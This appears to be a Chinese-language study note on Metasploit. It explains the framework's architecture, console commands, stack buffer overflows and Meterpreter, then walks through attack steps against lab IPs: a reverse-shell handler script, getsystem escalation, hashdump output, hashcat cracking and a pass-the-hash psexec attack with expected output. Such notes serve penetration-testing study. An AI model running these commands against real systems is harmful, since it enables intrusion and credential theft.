# MSF

> 🎯 本文按「介绍 → MSF专业术语 → 攻击荷载(Payload) → 溢出代码（Shellcode） → 模块（Module） → 监听器（Listener） → MSF框架介绍 → MODULES（最下面那个绿色框）」的顺序整理，便于对照速查。

## 介绍

Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数2000多个已知软件漏洞的专业级漏洞攻击工具，在kali系统中已经集成好了。当H.D. Moore在2003年发布MSF时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为MSF团队一直都在努力开发各种攻击工具，并将它们贡献给所有MSF用户。

## MSF专业术语

渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。流行的攻击技术包括：缓冲区溢出、Web应用程序漏洞攻击，以及利用配置错误等。

### 攻击荷载(Payload)

攻击载荷是我们期望目标系统在被渗透攻击后而执行的代码。在MSF框架中可以自由的选择、传送和植入。

比如，反弹式shell是一种从目标主机到攻击主机创建网络连接，并提供命令行shell的攻击载荷。反弹式 shell 就是让被控端主动连回你的机器，然后你在自己机器上得到一个能执行命令的"壳"。

bind shell攻击载荷则在目标主机上将命令行shell绑定到一个打开的监听端口，攻击者可以连接这些端口来取得shell交互。也就是攻击成功之后，在目标主机上执行的继续攻击的代码。

### 溢出代码（Shellcode）

shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令后，才会提供一个命令行shell或者Meterpreter shell，这也是shellcode名称的由来。

### 模块（Module）

模块就是封装了一组动作的功能代码。

在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候，你可能会使用一个渗透攻击模块（Exploit module），也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用一个辅助模块（auxiliary module），用来扫描一些诸如扫描或系统查点的攻击动作。

### 监听器（Listener）

监听器是MSF中用来等待连入网络连接的组件。举例来说，在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。攻击成功后运行一个监听代码，实时将主机信息发送给我们。

### MODULES（最下面那个绿色框）

Payloads、Exploits、Encoders、Post-Mods、Auxiliary

这是 Metasploit 的"弹药库"，真正干活的模块

| 模块      | 说明                                                         |
|-----------|--------------------------------------------------------------|
| Payloads  | 打进去之后在目标上跑的代码（比如反弹 shell、Meterpreter）    |
| Exploits  | 利用漏洞打进目标，并负责把 Payload 送进去                    |
| Encoders  | 给 Payload 编码，处理坏字符（bad chars），保证 shellcode 能安全落地 |
| Post-Mods | 拿到权限之后的操作（提权、抓哈希、留后门）                   |
| Auxiliary | 不投递 Payload 的辅助模块：端口扫描、爆破、嗅探              |

这个框上面有一根粗箭头指进 MSF BASE —— 模块由 CORE 扫描加载和缓存，由 BASE 编排调度执行。

### LIBRARIES（中间那个大绿框）

框里三个盒子，从下到上排列，箭头朝上：

#### Rex（浅蓝色，在最上面）

全名 Ruby Extension Library，是最底层的工具箱
只管技术，不管渗透：Socket、SSL、HTTP、SMB、DCERPC、DNS 等协议实现，还有编码、日志、文本处理
相当于"零件厂"

#### MSF CORE（深蓝色，中间）

框架的"大脑 / API 层"
**管**：模块的扫描与加载、Session（会话）管理、选项存储（Datastore）、事件系统、数据库（PostgreSQL）
相当于"发动机"

### MSF BASE（深蓝色，最下面）

- 对 CORE 的**再封装**，给上层提供一个好用的操作接口
- 负责把"用户想干什么"翻译成 CORE 的调用，并编排模块执行流程
- 相当于"方向盘"

```
Rex   = 通用底层库：网络、协议、编码、汇编、文本解析、文件格式、ROP/opcode 数据库
CORE  = 框架的定义者：模块管理、会话管理、事件分发、选项存储、数据库、插件、handler
BASE  = 给人用的门面 + 会话的具体实现：简化 API、Msf::Sessions::Meterpreter 等会话类、结果序列化（JSON/CSV/表格）
```

### INTERFACES（右边绿色框）—— 用户界面

| 模块     | 说明                                                         |
|----------|--------------------------------------------------------------|
| Console  | msfconsole，命令行交互界面（实际最常用的就是它）             |
| CLI      | 早期的一次性命令行接口（msfcli）                             |
| WEB      | 网页界面，分 Pro / Community 两个版本                        |
| GUI      | 图形界面，同样分 Pro / Community                             |
| Armitage | 独立的图形化前端（**不是 MSF 官方内置组件**），由独立开发者开发，Kali 曾预装，**现已基本停止维护**。 |

### TOOLS（左上角）

有一根箭头直接指向 Rex

这代表框架外面那群独立小工具：msfvenom、msf-pattern_create、msf-nasm_shell、msfrpcd 等

 它们的共同点是**不用启动 `msfconsole` 交互界面**。

但按**依赖深度**分三档：

| 档位     | 工具                               | 依赖                                                         |
|----------|------------------------------------|--------------------------------------------------------------|
| 纯 Rex   | msf-pattern_create、msf-nasm_shell | 只用到 rex/text、rex/assembly/nasm                           |
| 轻量框架 | msfvenom                           | 建一个只装 payload/encoder/nop 的框架（Msf::Simple::Framework）+ CORE 的 Msf::PayloadGenerator，不连数据库 |
| 完整框架 | msfconsole、msfrpcd、msfd、msfdb   | 完整框架 + PostgreSQL                                        |

### PLUGINS（左侧中间）

在 msfconsole **运行时**挂进去的扩展，用来增强**框架自身**的能力（官方自带和自己写的都算），例如 `load wmap`、`load sqlmap`、`load nessus`。

**和 Modules 的关键区别**：

- **Modules** → 攻击**目标**（打别人）
- **Plugins** → 增强**框架**（武装自己）

所以图上 Modules 和 Plugins 两根箭头最终都汇进 MSF BASE —— 但一个提供攻击能力，一个提供框架能力。

```
框架内核在启动时把 MODULES 和 PLUGINS 挂进框架（②）；你通过 INTERFACES 下命令，命令沿着 BASE → CORE → 模块 → Rex 一路往下执行（③）；执行结果和运行中发生的事，由 CORE 的 EventDispatcher 广播回界面和插件（④）；而 TOOLS 走旁路，直接借 Rex 的底层能力（④）。
```

### A. 帮助与信息

#### `?`

显示帮助。**最实用的命令**，忘了怎么写就查它。

```bash
?                    # 列出所有命令（也可以写 help）
? set                # 查 set 的具体用法和参数
? search             # 同理
```

#### `banner`

显示 / 更换 / 关闭启动 banner（就是那个 ASCII 艺术字）。

```bash
banner               # 随机换一个
banner metasploit    # 指定某个
banner none          # 关掉（看着清爽）
```

#### `version`

查看框架版本信息。

```bash
version
version -h           # 还能看 Ruby / API 等更多信息
```

### B. 模块查找与选择

#### `search`

搜索模块。支持多种过滤关键字，**结果带序号，可直接被 `use` 引用**。

```bash
search ms17-010                          # 按名字/关键字
search type:exploit platform:windows smb # 按类型+平台+服务
search cve:2017-0144                     # 按 CVE 编号
search name:eternalblue rank:excellent   # 按名称+评级
search -S rank                           # 按 rank 排序
```

**常用过滤关键字**：`type:` `platform:` `cve:` `name:` `rank:` `author:` `arch:`

#### `use`

**选中模块**，进入模块上下文。选中后提示符会变：

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

```bash
use exploit/windows/smb/ms17_010_eternalblue
use 0                # 用 search 结果里的序号，最省事
```

> 选中后**所有 `set` 都作用于这个模块**。

#### `back`

从模块上下文**退回上一层**。

```bash
back                 # 提示符变回 msf6 >
```

> 退回后原来 `set` 的选项就没了（`setg` 的还在），这是新手最容易懵的地方。

#### `info`

查看模块的**详细信息**：描述、作者、参考 CVE/链接、可用 target、选项、rank 等。

```bash
use exploit/windows/smb/ms17_010_eternalblue
info                                     # 看当前模块

info exploit/windows/smb/ms17_010_eternalblue   # 不 use 也能直接看
```

#### `show`

显示模块的**各类清单**。这是 `set` 之前必做的一步。

```bash
show options          # ★ 最常用：看有哪些选项要填
show advanced         # 高级选项
show missing          # 只看【还没填】的必填项 ← 排查漏填神器
show payloads         # 当前 exploit 支持哪些 payload
show targets          # 支持哪些目标系统版本
show encoders         # 可用编码器
show nops             # 可用 NOP 生成器
show evasion          # 可用免杀选项
show all              # 全看
```

### C. 参数设置

#### `set`

设置**当前模块**的选项。

```bash
set RHOSTS 10.0.0.5
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set                          # 不带参数 = 列出当前所有已设置的值
```

#### `setg`

设置**全局**选项（g = global），**跨模块保留**，退出模块也不丢。

```bash
setg LHOST 192.168.1.10      # ★ 强烈建议 LHOST 用 setg
setg LPORT 4444
setg                          # 列出全局设置
```

> **`set` vs `setg` 是这份列表里最重要的区别**：
> - `set` → 只对当前模块有效，`back` 之后失效
> - `setg` → 全局有效，换模块照样在（LHOST/LPORT 这类到处都要填的，一律用 setg）

#### `unset`

清除**当前模块**的某个选项。

```bash
unset RHOSTS
unset RHOSTS RPORT           # 可一次清多个
```

#### `unsetg`

清除**全局**选项。

```bash
unsetg LHOST
unsetg LHOST LPORT
```

#### `save`

把当前的全局设置**写入配置文件**，下次启动 msfconsole 时自动加载。

```bash
save
```

> ⚠️ 注意：会把 `setg` 的内容（可能含密码、目标 IP）明文写进 `~/.msf4/` 下的配置，
> 在共享环境里慎用。

### D. 运行与连接

#### `connect`

**相当于 `nc`** —— 直接用框架自带网络栈建立一个 TCP 连接，不经过任何模块。

```bash
connect 10.0.0.5 445              # 连目标 445
connect -h                        # 看用法（支持 SSL、代理、超时等）
```

> 用途：模块打不通时手工摸服务、验证端口、发原始数据。走框架的好处是**能套代理**。

#### `route`

给已拿到的 **session 添加路由**，实现内网穿透（pivoting）。

```bash
route add 10.10.10.0/24 1         # 把 10.10.10.0/24 的流量路由到 session 1
route print                       # 查看现有路由
route del 10.10.10.0/24 1         # 删除
route flush                       # 清空
```

> 用法：先 `sessions -i 1` 拿到内网机器 → `back` → `route add` → 之后就能直接扫内网了。

#### `jobs`

列出**后台任务**（监听 handler、扫描器、后台 exploit 等）。

```bash
jobs                              # 简表
jobs -l                           # 详细
jobs -v                           # 更详细
```

#### `kill`

**终止**一个 job。

```bash
kill 0                            # 结束 job 0
kill -9 1                         # 强制
jobs -k 2                         # 也可用 jobs 直接杀
```

#### `sleep`

**暂停指定秒数**。主要用于 rc 脚本里等目标重启/等超时。

```bash
sleep 5
```

> 和 meterpreter 里的 `sleep`（设置 beacon 心跳间隔）不是一回事，注意区分上下文。

### E. 扩展与脚本

#### `load`

**加载插件**（增强框架自身的能力）。

```bash
load wmap
load sqlmap
load nessus
```

#### `unload`

**卸载插件**。

```bash
unload wmap
```

#### `loadpath`

**追加自定义模块路径** —— 把你自己写的模块目录挂进框架。

```bash
loadpath /root/my_modules
loadpath                         # 不带参数：列出当前所有搜索路径
```

> 比直接往 `modules/` 里塞更好用，升级不丢。

#### `resource`

**执行 rc 资源脚本**（rc ≈ Windows 的批处理）。

```bash
resource /root/auto.rc           # 执行脚本
resource (                       # 进入多行输入模式，最后单独一行 ) 结束
```

**rc 脚本的典型用途**：

```bash
# auto.rc 示例：一键起 handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
setg LHOST 192.168.1.10
setg LPORT 4444
run -j
```

**配合启动参数**：`msfconsole -r auto.rc`

#### `irb`

进入 **Ruby 交互环境**，可以直接操作框架对象（写脚本/调试用）。

```bash
irb
>> framework.sessions               # 看所有会话
>> framework.modules                # 看模块管理
```

## 缓冲区溢出

### 一、是什么

**定义**：程序向缓冲区写入的数据长度**超过**了缓冲区本身的容量，多出来的数据**溢出并覆盖**了相邻内存上的合法数据。

```
[ 缓冲区 buf[64] ][ 相邻数据（可能是返回地址、函数指针…） ]
        ↑
   写入 100 字节 → 后 36 字节淹到隔壁去了
```

### 为什么会发生

- **理想情况**：程序会检查输入长度，不允许写入超过缓冲区容量的数据
- **现实情况**：大量程序默认"数据长度总是和分配的空间匹配"，不做边界检查 → 埋下隐患

> 典型元凶是 C 语言里一批**不检查边界**的函数：
> `strcpy` `strcat` `sprintf` `gets` `memcpy`（长度参数算错时）

---

### 概念澄清：缓冲区 ≠ 堆栈

| 概念           | 英文         | 说明                                                     |
|----------------|--------------|----------------------------------------------------------|
| **缓冲区**     | buffer       | 一块用来临时存数据的**内存区域**，可能分配在**任何地方** |
| **栈**         | stack        | 函数调用用的内存区（局部变量、返回地址）                 |
| **堆**         | heap         | 程序运行时动态分配的内存区（`malloc` / `new`）           |
| **BSS/数据段** | .bss / .data | 全局变量、静态变量                                       |

**缓冲区可以在栈上、可以在堆上、也可以是全局的**

```
一个程序的内存布局：

高地址  ┌──────────────┐
        │    栈 stack   │ ← 函数局部变量（栈上的缓冲区在这）
        ├──────────────┤
        │      ↓       │
        │      ↑       │
        ├──────────────┤
        │    堆 heap    │ ← malloc 出来的缓冲区在这
        ├──────────────┤
        │  .bss/.data  │ ← 全局缓冲区（如 char buf[1024]）在这
        ├──────────────┤
低地址  │   .text 代码  │
        └──────────────┘
```

> 另外，「堆栈」这个词在中文里有歧义：有时指 **stack（栈）**，有时指 **heap + stack（堆和栈）**。
> 严格说 **栈溢出（stack overflow）** 和 **堆溢出（heap overflow）** 是两类不同的漏洞。

---

### 分类

| 类型             | 溢出位置            | 典型利用目标                           |
|------------------|---------------------|----------------------------------------|
| **栈溢出**       | 栈上的局部数组      | **覆盖函数返回地址** ← 最经典、最危险 |
| **堆溢出**       | `malloc` 出来的内存 | 覆盖堆管理结构 / 相邻对象的数据        |
| **BSS 溢出**     | 全局/静态数组       | 覆盖相邻全局变量、函数指针             |
| **整数溢出引发** | 长度计算处          | 长度算错导致分配不足或绕过检查         |

---

### 栈溢出原理（重点）

栈帧布局

```
高地址
    ┌────────────────────┐
    │   调用者的栈帧      │
    ├────────────────────┤
    │   函数参数          │
    ├────────────────────┤
    │ ★ 返回地址 (EIP)   │ ← 函数返回时跳到这里！
    ├────────────────────┤
    │   保存的 EBP        │
    ├────────────────────┤
    │   局部变量          │
    │   char buf[64]     │ ← 往这写超过 64 字节，就会向【高地址】淹没
    └────────────────────┘
低地址
```

**关键**：函数执行完要 `ret`，会从栈上弹出**保存的返回地址**跳到那里继续执行。
如果能**覆盖这个返回地址**，就能让程序跳到**任意地址** —— 这就是控制流劫持。

经典利用布局

```
[ NOP sled ][ shellcode ][ 覆盖返回地址 → 指向 NOP sled ]
   滑行区      恶意代码         跳回前面
```

- **为什么要 NOP sled**：无法精确知道 shellcode 在内存中的地址，用一大片 NOP（`\x90`）做"滑梯"，只要跳进 sled 的**任意位置**都能滑到 shellcode
  → 这对应 MSF 里的 **`nops/` 模块**（`x86/opty2` 等）
- **为什么要处理坏字符**：某些字节（`\x00` 截断字符串、`\x0a\x0d` 换行）会破坏 payload
  → 这对应 MSF 里的 **`encoders/` 模块**和 `set BadChars`

---

### 形象的解释

#### 先认识这排柜子

程序运行时，内存里有一排**紧挨着的柜子**:

```
┌────────┐┌────────┐┌────────┐┌────────┐┌────────┐┌────────┐
│ 柜子 1 ││ 柜子 2 ││ 柜子 3 ││ 柜子 4 ││ 柜子 5 ││ 柜子 6 │
│        ││        ││        ││        ││ 旧钥匙 ││ 一张   │
│        ││        ││        ││        ││        ││ 纸条   │
└────────┘└────────┘└────────┘└────────┘└────────┘└────────┘
    └────────── 你的储物区 ──────────┘
```

| 柜子      | 装的是       | 有什么用                              |
|-----------|--------------|---------------------------------------|
| **1 ~ 4** | 你放的东西   | 你的储物区（程序里的"缓冲区"）        |
| **5**     | 一把旧钥匙   | 顺手存的，平时用不上                  |
| **6**     | **一张纸条** | 写着「这摊活干完了，**回 3 楼**继续」 |

> 这张纸条，在程序里叫 **「返回地址」**。
> 它的唯一作用就是告诉程序：**这一步做完了，下一步该去哪儿。**

#### 程序本来有个规矩

```c
void 干活(char *你输入的东西) {
    char 你的柜子[16];              // 只准备了 4 个柜子的空间
    strcpy(你的柜子, 你输入的东西);   // ← 问题就在这一行
}
```

**写代码的人心想**：「我只给了 4 个柜子，用的人肯定只放 4 个柜子的东西吧。」

**但 `strcpy` 这个搬运工不数数。**

**它的逻辑是**：「你让我搬多少，我就搬多少, 我只要把自己的东西全部放在柜子里面就好了，不管是不是占了不属于自己的柜子。」

你给它 6 个柜子的量，它就**老老实实塞 6 个**，从柜子 1 一路塞到柜子 6 —— **完全不管柜子 5 和 6 里原本放着什么。**

---

#### 塞太多的那一刻

你输入了 6 个柜子的量：

```
┌────────┐┌────────┐┌────────┐┌────────┐┌────────┐┌──────────┐
│ AAAAAA ││ BBBBBB ││ CCCCCC ││ DDDDDD ││ EEEEEE ││ "回88楼" │
└────────┘└────────┘└────────┘└────────┘└────────┘└──────────┘
    ①         ②         ③         ④         ⑤          ⑥
```

- ①②③④ → 正常，放在你自己的区域里
- ⑤ → **把旧钥匙挤掉了**（通常没啥后果）
- ⑥ → **把那张纸条换成了你自己写的！**

纸条上原本写着「回 3 楼」，现在变成了你写的 **「回 88 楼」**。

#### 最关键的一步：程序只会照着纸条走

程序干完活、准备离开这个函数时，它的动作是：

> **「我看看纸条上写的是哪儿……哦，88 楼。行，去 88 楼。」**

程序**根本不会怀疑这张纸条**。

它自己不认识路，**完全照着纸条走**：

- 纸条写 3 楼 → 回 3 楼（正常工作）
- 纸条写 88 楼 → **去 88 楼（你说了算）**

> **这就是"跳转"的全部真相。**
> 跳转不是程序"想"跳，而是程序**只会照着纸条跳**，而纸条被你换掉了。

---

#### 那你写什么"楼层"呢？

这就是攻击者要决定的事：

| 纸条上写什么                 | 结果                                                 |
|------------------------------|------------------------------------------------------|
| **乱写**（比如 `AAAA`）      | 跑到一个不存在的地方 → 程序**崩溃**（拒绝服务 DoS） |
| **某个函数的地址**           | 跑去执行那个函数 —— 哪怕它本来轮不到执行           |
| **你自己塞进去的代码的地址** | 执行**你写的代码** → 拿到 shell，为所欲为           |

#### 比喻 ↔ 专业术语对照表

| 储物柜比喻             | 专业术语                          | 说明                   |
|------------------------|-----------------------------------|------------------------|
| 一排紧挨着的柜子       | **栈（stack）**                   | 函数临时使用的内存区   |
| 柜子 1~4（你的储物区） | **缓冲区** `char buf[16]`         | 局部数组，16 字节      |
| 不数数的搬运工         | **`strcpy` / `gets` / `sprintf`** | 不检查边界的函数       |
| 柜子 5 的旧钥匙        | **保存的 EBP**                    | 上一个函数的栈基址     |
| 柜子 6 的纸条          | **返回地址**                      | 函数干完活要跳回的地方 |
| 纸上的"楼层号"         | **EIP / RIP**（指令指针）         | 下一条要执行的指令地址 |
| 程序"看纸条→跳过去"   | **`ret` 指令**                    | 本质就是 `pop eip`     |
| 封条                   | **Stack Canary**                  | 检测返回地址是否被动过 |
| 一格柜子 4 字节        | 32 位下的一个"字"                 | **64 位下是 8 字节**   |

---

#### 危害

| 后果     | 说明                                                       |
|----------|------------------------------------------------------------|
| **最轻** | 程序运行失败 / 崩溃 → **拒绝服务（DoS）**                 |
| **最重** | 执行任意代码 → **拿到 shell、取得系统特权**，进而为所欲为 |

## Meterpreter

### 一句话定位

**Meterpreter 不是"一个 shell"，而是一个注入到目标进程内存里的「后渗透平台」。**

普通反弹 shell 是"给你一个命令行"，Meterpreter 是"给你一整套操作目标的能力"。

### 和普通 shell 的区别

|          | 普通 shell（`cmd.exe` 反弹） | **Meterpreter**                                     |
|----------|------------------------------|-----------------------------------------------------|
| 运行位置 | 启动系统命令解释器           | **注入到已有进程的内存中**，不新建进程              |
| 磁盘痕迹 | 会留下可执行文件、新进程     | **无文件落地**，任务管理器里看不到新进程            |
| 通信协议 | 明文 TCP                     | **加密 TLV 协议**（可走 TCP / HTTP / HTTPS）        |
| 功能范围 | 只能执行命令                 | 文件、进程、摄像头、键盘、提权、抓 hash、端口转发   |
| 扩展性   | 无                           | **可动态加载扩展**（`load kiwi`、`load incognito`） |
| 稳定性   | 断线即结束                   | 支持超时重连、迁移进程                              |

### 工作机制：stager + stage（两阶段）

```
① 先投递一个小体积的 stager（投递器）
       ↓  它唯一的工作：回连攻击者
② 攻击者把完整的 Meterpreter（stage，几百 KB）推给目标
       ↓
③ 会话建立
```

---

```
漏洞能让你塞进去的空间：  408 字节         （MS08-067 的源码写死的：Space => 408）
完整的 Meterpreter 大小： 255679 字节      （约 250 KB）
```

**差了 600 多倍。**

用**信封**打比方：

```
漏洞给你的 = 一个只能装 408 字节的【小信封】
Meterpreter = 一本 255679 字节的【书】

→ 信封装不下书
```

那怎么办？

**信封里只装一张便签，上面写：「打这个电话找我」**

---

装大型游戏的流程是：

```
① 你下载一个【很小的安装器】        （比如 2 MB）
② 运行它，它自己去网上连服务器
③ 服务器把【很大的游戏主体】传给它   （比如 10 GB）
④ 游戏装好了
```

**MSF 的机制一模一样：**

| 游戏       | MSF                   | 大小        |
|------------|-----------------------|-------------|
| 小安装器   | **stager**（投递器）  | 几百字节    |
| 游戏主体   | **stage**（载荷主体） | 255679 字节 |
| 游戏服务器 | 你的 Kali             | —          |

---

**stager 到底做了什么**

**它小，是因为它只干 4 件事** —— 用伪代码就是：

```
s = socket()                              # 1. 建一个网络连接
s.connect("192.168.110.135", 4444)        # 2. 连回攻击者
data = s.recv()                           # 3. 从这条连接接收数据
execute(data)                             # 4. 把收到的数据当代码执行

就这 4 步，它要几百字节
```

**完整过程（带数据流）**

```
【第一步：塞信封】

  Kali                                    Win7 目标
   │                                          │
   │  ① 发送漏洞利用包（SMB 漏洞）             │
   │─────────────────────────────────────────▶│
   │                                          │  漏洞触发
   │                                          │  ↓
   │                                          │  执行了那几百字节的 stager
   │                                          │
   │  ② stager 主动连回来（反弹）             │
   │◀─────────────────────────────────────────│
   │     （从目标的随机端口 49187 → 你的 4444）│
   │                                          │
   │  ← 此时已经是一条【普通的 TCP 连接】了 →  │


【第二步：送货】

   │                                          │
   │  ③ 你把 255679 字节的 Meterpreter        │
   │     写进这条连接                         │

   │                                          │  ↓
   │                                          │  stager 的 execute() 执行它
   │                                          │  ↓

   │                                          │
```

为什么要这么设计？（3 个原因）

| #      | 原因            | 说明                                                         |
|--------|-----------------|--------------------------------------------------------------|
| **①** | **空间不够** ⭐ | 这才是根本原因。漏洞能写入的字节数有限（408 字节），装不下 250 KB |
| ②     | **灵活性**      | payload 可以后送 —— 这次送 meterpreter，下次送别的，**不用重新打一遍漏洞** |
| ③     | **兼容性**      | 同一个 exploit 可以配不同的 stage（meterpreter / shell / VNC…） |

**核心就是第 ① 条**：不是 MSF 想搞得这么复杂，是**漏洞本身不给你足够空间**。

##### **`getsystem` 的三种技术**

```

...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

| #     | 名称                                               | 副作用            | 前提条件                                 | 适用版本          | **效果 / 意义**                                              |
|-------|----------------------------------------------------|-------------------|------------------------------------------|-------------------|--------------------------------------------------------------|
| **0** | All Techniques                                     | —                | —                                       | 从 1 依次试到成功 | 不用自己判断，一键全试；代价是可能用上留痕最重的那个         |
| **1** | Named Pipe Impersonation                           | 创建服务          | **本地管理员组**                         | XP/2003+          | 管理员 → SYSTEM，**老系统上成功率最高**；但会**留下一个服务**，事后要删 |
| **2** | Named Pipe Impersonation<br>（DLL Dropper 变体）   | 创建服务 + 写磁盘 | 本地管理员组                             | XP/2003+          | 技术 1 的备选 —— 当**命令执行被限制**时也能提；代价是**磁盘上多一个 DLL** |
| **3** | **Token Duplication**                              | 注入进程          | **`SeDebugPrivilege`**                   | XP/2003+          | 管理员 → SYSTEM，**不碰服务配置**，比 1/2 干净；代价是注入进程（EDR 敏感） |
| **4** | Named Pipe Impersonation<br>（RPCSS 变体）         | **无**            | 你是 `NETWORK SERVICE`（调试权限）       | Win8.1/2012R2+    | ⭐ **不用管理员权限**，`NETWORK SERVICE` 直接冲到 SYSTEM；**零痕迹** |
| **5** | Named Pipe Impersonation<br>（Print Spooler 变体） | **无**            | **`SeImpersonatePrivilege`**（模拟权限） | Win8.1/2012R2+    | ⭐ **服务账户 → SYSTEM 的万能钥匙**；**零痕迹**、成功率极高 |
| **6** | Named Pipe Impersonation<br>（EfsPotato 变体）     | **无**            | **`SeImpersonatePrivilege`**（备份权限） | Vista/2008+       | ⭐ 同技术 5，但**兼容更老的系统**（Vista/2008 起就能用）     |

**使用说明**

```bash

meterpreter > getprivs

# ③ 指定某一技术（针对性尝试）
meterpreter > getsystem -t 3
```

#### ⑤ 凭据获取（重点）

##### **`hashdump` —— 导出本地账户哈希**

**前提**：**必须是 SYSTEM 权限**

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jaden:1000:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678:::
test:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
```

**哈希存在哪**：`C:\Windows\System32\config\SAM`

---

**哈希格式详解**

```
Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0 : : :
      ↑         ↑                  ↑                                  ↑
    用户名     RID            LM 哈希                            NTLM 哈希
```

**Windows 存密码，用的是"双重哈希"**

**"老"和"新"指的是【协议】，不是【密码】。，同一个密码，用新老协议算两遍，各存一份**

内置 Administrator 的 RID 固定是 **500**，Guest 是 **501**，新建用户从 1000 开始。

---

**两个必须记住的"万能哈希"：**

| 哈希值                             | 含义                                      |
|------------------------------------|-------------------------------------------|
| `aad3b435b51404eeaad3b435b51404ee` | **LM 空哈希**（LM 未存储 / 密码为空），老 |
| `31d6cfe0d16ae931b73c59d7e0c089c0` | **NTLM 空密码**，新                       |

---

**解释上面那份 dump **

```
Administrator : NTLM = 31d6cfe...c089c0  →  ⚠️ 管理员是【空密码】！
Guest         : 同上                     →  空 + 默认禁用
jaden         : NTLM = 3dbde697...      →  破解为 123
```

##### **破解哈希**

**方式一**：在线破解

| 网站                        | 说明               |
|-----------------------------|--------------------|
| `https://cmd5.com/`         | 中文，支持多种哈希 |
| `https://hashkiller.co.uk/` | 英文，NTLM 库很大  |

**方式二**：离线破解

```bash
# hashcat（推荐，离线）
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt    # NTLM
hashcat -m 3000 hashes.txt /usr/share/wordlists/rockyou.txt    # LM

hash密码要放在hashes.txt中
```

---

##### **更狠的：不用破解，直接传递哈希（PTH / Pass-The-Hash）**

**核心思想**：Windows 认证时用的不是明文密码，而是 **NTLM 哈希**。
所以只要你手上有哈希，就能**跳过破解**，直接拿去认证。

```
正常登录：  你输入密码 → 系统算出 NTLM 哈希 → 拿去认证
PTH 攻击：  你跳过第一步 ─────────────────→ 直接把哈希拿去认证 ✅
```

1. 先分清：**哪种哈希能 PTH**（很重要）

| 哈希类型       | 从哪来                           | 能 PTH 吗               |
|----------------|----------------------------------|-------------------------|
| **NTLM 哈希**  | `hashdump`、`kiwi` / `creds_all` | ✅ **能！**             |
| NetNTLMv1 / v2 | Responder 抓的挑战响应           | ❌ **不能**，必须先破解 |

**所以你手上有 `hashdump` 出来的 NTLM 哈希，才能走这条路。**

2. 四个前置条件（先确认）

| #  | 条件                   | 怎么确认                        |
|----|------------------------|---------------------------------|
| ① | **445 开放**           | `nmap -Pn -p 445 <目标>`        |
| ② | **`ADMIN$` 共享开启**  | `psexec` 要往里写文件（默认开） |
| ③ | **目标账户是管理员**   | 普通用户的哈希没用              |
| ④ | **⚠️ 不是空密码账户** | 空密码账户**默认禁止网络登录**  |

> 第 ④ 条是最大的坑 —— 如果你的 `Administrator` 是空密码（`31d6cfe...`）， **PTH 必定失败**。换一个有密码的账户。

3. 拿到哈希

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:24d8ebd79ebce1dfef9dded12d296b:::
```

4. 抄哈希（**只要中间那两段**）

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
└─────┬─────┘└─┬─┘└────────── 抄这段 ──────────┘└──────── 和这段 ────────┘
   用户名     RID         LM 哈希                        NTLM 哈希
   （不要抄） （不要）          └────── 中间加个冒号 ──────┘
```

**最终得到：**

```
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
└────────── LM ────────────────┘↑└───────── NTLM ───────────────┘
                        这个冒号不能少
```

5. **先验证**，别急着打

```
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.110.136
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser Administrator
msf6 auxiliary(scanner/smb/smb_login) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 auxiliary(scanner/smb/smb_login) > run
```

**看到这个才继续：**

```
[+] 192.168.110.136:445 - 192.168.110.136 - Success: '.\Administrator:<hash>' Administrator
                            ^^^^^^^
                        哈希有效！
```

**看到 `FAILED` → 别往下走了**，是前置条件没满足（多半是空密码那个坑）。

6. 用 `psexec` 拿 session

```
msf6 > use exploit/windows/smb/psexec

msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.110.136
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

msf6 exploit(windows/smb/psexec) > setg LHOST 192.168.110.135    # ★ 你的 IP
msf6 exploit(windows/smb/psexec) > set LPORT 4444

msf6 exploit(windows/smb/psexec) > show missing                  # 确认没漏
msf6 exploit(windows/smb/psexec) > run
```

**成功的样子：**

```
[*] Started reverse TCP handler on 192.168.110.135:4444
[*] 192.168.110.136:445 - Connecting to the server...
[*] 192.168.110.136:445 - Authenticating to 192.168.110.136:445 as user 'Administrator'...
[*] 192.168.110.136:445 - Selecting PowerShell target
